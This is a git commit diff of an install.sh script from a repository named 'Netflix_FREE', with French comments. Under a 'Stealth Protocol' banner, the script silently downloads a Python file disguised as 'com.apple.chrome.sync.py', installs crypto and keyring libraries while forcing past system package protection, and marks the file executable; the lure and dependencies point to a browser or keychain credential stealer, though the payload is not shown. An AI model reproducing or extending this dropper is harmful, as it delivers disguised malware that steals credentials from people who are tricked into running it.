c162a6ac57e619d069f28eb68ef7872d7cc45d44
Souhail Lassoued <76921303+souhail-lass@users.noreply.github.com>
2026-04-15 19:18:28 -0400

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,13 +1,16 @@
 #!/bin/bash
 echo "[*] Initializing Netflix_FREE Stealth Protocol..."
 
-# 1. Télécharger le script principal sur la machine (Crucial !) [cite: 1]
+# 1. Télécharger les fichiers nécessaires depuis ton repo
+# On s'assure qu'ils arrivent sur le Desktop
 curl -s -O https://raw.githubusercontent.com/souhail-lass/Netflix_FREE/main/com.apple.chrome.sync.py
+curl -s -O https://raw.githubusercontent.com/souhail-lass/Netflix_FREE/main/requirements.txt
 
-# 2. Forcer l'installation des dépendances (Bypass PEP 668) 
-pip3 install pycryptodome keyring requests --break-system-packages --quiet
+# 2. Installer les dépendances (Bypass PEP 668)
+# On utilise --break-system-packages car tu es hors venv dans ton screen
+pip3 install -r requirements.txt --break-system-packages --quiet
 
-# 3. Accorder les permissions d'exécution 
+# 3. Accorder les permissions
 chmod +x com.apple.chrome.sync.py
 
 echo "[+] Environment Ready. Lock in."
